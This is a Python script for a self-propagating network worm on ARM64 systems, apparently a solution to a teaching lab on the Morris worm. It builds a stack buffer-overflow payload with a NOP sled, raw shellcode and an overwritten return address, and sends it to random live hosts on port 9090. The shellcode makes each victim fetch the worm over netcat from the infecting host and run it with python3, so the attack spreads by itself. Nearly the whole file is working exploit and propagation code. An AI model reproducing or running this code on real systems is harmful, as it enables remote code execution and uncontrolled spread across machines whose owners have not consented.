#!/bin/env python3
import sys
import os
import time
import subprocess
import re
from random import randint

# this is for aarch64 system; will not work on x86 systems

# Find the next victim (return an IP address).
# Check to make sure that the target is alive.
def getNextTarget():
    return '10.'+ str(randint(151,153)) + '.0.' + str(randint(70, 80))

def getHostAddress(): 
    ip_a = subprocess.run("ip a | grep -oE \"([0-9]+\.)+[0-9]+\" | grep \"10\\.\" | grep -v 255 | sort", shell=True, capture_output=True) 
    return ip_a.stdout.split()[-1].decode() 

hostIP = getHostAddress()

# Create the badfile (the malicious payload)
def createBadfile(shellcode):

    # Fill the content with NOP's (0xD503201F is NOP instruction in arm64)
   nop = (0xD503201F).to_bytes(4,byteorder='little')
   content = bytearray(517)
   for offset in range(int(500/4)):
       content[offset*4:offset*4 + 4] = nop

   ##################################################################
   # Put the shellcode somewhere in the payload
   start = 200     # Need to change 
   content[start:start + len(shellcode)] = shellcode

   # Decide the return address value
   # and put it somewhere in the payload
   buffer_start_address = 0x0000fffffffff540
   caller_frame_pointer_address = 0x0000fffffffff5b0
   ret    = buffer_start_address + 160  # Need to change
   offset = caller_frame_pointer_address - buffer_start_address + 8  # Need to change

   content[offset:offset + 8] = (ret).to_bytes(8,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)


############################################################### 

print("The worm has arrived on this host ^_^", flush=True)

# This is for visualization. It sends an ICMP echo message to 
# a non-existing machine every 2 seconds.
subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)

attack_success = False

# Launch the attack on other servers
while True:
    targetIP = getNextTarget()

    if targetIP == hostIP:
        continue
    # You can use this shellcode to run any command you want
    shellcode= (
       "\xab\x05\x01\x10\x0c\x04\x84\xd2\x73\x01\x0c\xcb\x29\x01\x09\x4a"
       "\x28\x05\x80\xd2\x69\x6a\x28\x38\x88\x05\x80\xd2\x69\x6a\x28\x38"
       "\xe8\x1d\x80\xd2\x69\x6a\x28\x38\x09\x04\x80\xd2\xe9\x03\x09\xcb"
       "\x69\x02\x09\xcb\x08\x01\x08\xca\x69\x6a\x28\xf8\x08\x01\x80\xd2"
       "\x49\x05\x80\xd2\xe9\x03\x09\xcb\x69\x02\x09\xcb\x69\x6a\x28\xf8"
       "\x08\x02\x80\xd2\x09\x06\x80\xd2\xe9\x03\x09\xcb\x69\x02\x09\xcb"
       "\x69\x6a\x28\xf8\x08\x03\x80\xd2\x29\x01\x09\xca\x69\x6a\x28\xf8"
       "\x09\x04\x80\xd2\xe9\x03\x09\xcb\x69\x02\x09\xcb\xe0\x03\x09\xaa"
       "\xe1\x03\x13\xaa\x94\x02\x14\xca\xe2\x03\x14\xaa\xa8\x1b\x80\xd2"
       "\xe1\x66\x02\xd4"
       "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
       "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
       "CCCCCCCC"   # Placeholder for argv[2] --> the command string
       "DDDDDDDD"   # Placeholder for argv[3] --> NULL
       "/bin/bash*"
       "-c****"
       # You can modify the following command string to run any command.
       # You can even run multiple commands. When you change the string,
       # make sure that the position of the * at the end doesn't change.
       # The code above will change the byte at this position to zero,
       # so the command string ends here.
       # You can delete/add spaces, if needed, to keep the position the same.
       # The * in this line serves as the position marker              *
      f"echo hello; nc -w5 {hostIP} 8888 > worm.py; sleep 3;          "
       "python3 worm.py                                                "
       "                                                               *"
    ).encode('latin-1')

    # Create the badfile 
    createBadfile(shellcode)


    try: 
        ping = subprocess.run(f"ping -q -c1 -W1 {targetIP}", shell=True, capture_output=True, check=True)
        result = ping.stdout.find(b"1 received")
        if result != -1: 
            print(ping)
            print(f"*** {targetIP} is alive, launch the attack", flush=True)
            # Send the malicious payload to the target host
            print(f"**********************************", flush=True)
            print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
            print(f"**********************************", flush=True)
            subprocess.Popen(f"nc -lvn 8888 < worm.py", shell=True)
            subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)
            time.sleep(10)
        else:
            print(f"{targetIP} is not alive", flush=True)
    except:
        print(f"{targetIP} is not alive", flush=True)

exit(0) # no need to run if you infect some other machine

